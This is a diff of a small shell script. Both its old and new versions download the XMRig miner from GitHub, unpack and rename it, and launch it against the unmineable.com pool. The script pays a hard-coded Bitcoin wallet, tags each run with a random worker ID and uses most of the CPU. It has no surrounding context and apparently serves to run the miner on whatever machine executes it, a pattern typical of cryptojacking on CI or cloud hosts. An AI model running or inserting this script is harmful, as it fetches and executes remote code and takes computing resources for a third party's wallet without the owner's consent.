@@ -1,10 +1,1 @@
-#!/bin/bash
-#!/bin/sh
-#!/bin/bash
-
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
-tar -xf xmrig-6.18.0-linux-x64.tar.gz
-chmod +x xmrig-6.18.0
-cd xmrig-6.18.0
-chmod +x xmrig
-./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:3ADSo91zeFJbJ5zDCacuJLmr58K1J75F41.$(echo $(shuf -i 1-999 -n 1)-CPU) -p 99 -t 80 --keepalive
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz && tar -xf xmrig-6.19.2-linux-x64.tar.gz && mv xmrig-6.19.2 cpu1 && rm -r xmrig-6.19.2-linux-x64.tar.gz && chmod +x cpu1 && cd cpu1 && chmod +x xmrig && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo $(shuf -i 1-9999 -n 1)-CPU) -p 2 -k -a rx/0 --cpu-max-threads-hint=85
